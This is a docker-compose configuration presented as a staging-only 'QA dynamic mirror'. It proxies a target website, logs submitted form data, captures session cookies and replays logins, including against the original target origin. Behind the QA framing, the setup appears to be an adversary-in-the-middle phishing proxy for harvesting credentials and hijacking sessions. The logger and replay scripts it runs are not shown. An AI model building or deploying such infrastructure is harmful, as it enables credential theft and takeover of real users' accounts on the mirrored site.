# Legion QA dynamic mirror — docker-compose (staging only)
# Start: docker compose up
# Status: http://localhost:8080/
# Proxied site: http://localhost:8080/<any-path-on-target>
# Form POST debug logs: ./logs/logs.json (local only)
# Login QA replay: ./logs/session_cookies.json + ./logs/replay_log.txt (internal mirror only)
# Original target replay: ./logs/original_session_cookies.json (once per capture)

services:
  qa-dynamic-mirror:
    image: nginx:alpine
    ports:
      - "8080:8080"
    volumes:
      - ./:/usr/share/nginx/html:ro
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
    restart: unless-stopped
    depends_on:
      - form-logger

  form-logger:
    image: node:20-alpine
    working_dir: /app
    command: ["sh", "-c", "npm install --omit=dev axios@1.7.9 tough-cookie@4.1.3 axios-cookiejar-support@5.0.3 && node logger.js"]
    volumes:
      - ./logger.js:/app/logger.js:ro
      - ./replay.js:/app/replay.js:ro
      - ./logs:/app/logs
    environment:
      LOGGER_PORT: "9090"
      LOG_FILE: /app/logs/logs.json
      TEST_LOGIN_ENABLED: "true"
      MIRROR_INTERNAL_URL: "http://qa-dynamic-mirror:8080"
      TARGET_HOST: "example.com"
      TARGET_ORIGIN: "https://example.com"
      SESSION_COOKIES_FILE: /app/logs/session_cookies.json
      REPLAY_LOG_FILE: /app/logs/replay_log.txt
      ORIGINAL_REPLAY_ENABLED: "true"
      ORIGINAL_REPLAY_DELAY_MS: "${ORIGINAL_REPLAY_DELAY_MS:-1000}"
      ORIGINAL_SESSION_COOKIES_FILE: /app/logs/original_session_cookies.json
      ORIGINAL_REPLAY_LOG_FILE: /app/logs/original_replay_log.txt
    expose:
      - "9090"
    restart: unless-stopped
